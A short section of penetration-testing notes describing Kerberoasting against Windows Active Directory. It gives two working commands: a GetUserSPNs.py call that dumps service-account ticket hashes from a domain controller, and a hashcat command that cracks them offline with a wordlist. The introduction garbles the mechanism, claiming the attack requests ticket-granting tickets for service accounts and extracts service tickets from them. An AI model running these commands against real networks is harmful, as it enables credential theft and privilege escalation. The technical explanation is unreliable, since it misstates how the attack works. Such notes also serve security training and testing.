# IV. Kerberoasting Overview

Kerberoasting is a technique used in cybersecurity to exploit weaknesses in the Kerberos authentication protocol, commonly used in Windows environments. In Kerberoasting, an attacker targets service accounts with weak encryption keys, requesting ticket-granting tickets (TGTs) for these accounts

 The attacker then extracts the encrypted service tickets from the TGTs and attempts to crack them offline to obtain the plaintext credentials. This attack can compromise sensitive accounts and escalate privileges within a network.

## Steps for Kerberoasting:

**Step 1: Get SPNs, Dump Hash.** `python GetUserSPNs.py <DOMAIN/username:password> -dc-ip <ip of DC> -request`

**Step 2: Crack that hash.** `hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`

## Reference:

[https://medium.com/@Shorty420/kerberoasting-9108477279cc](https://medium.com/@Shorty420/kerberoasting-9108477279cc)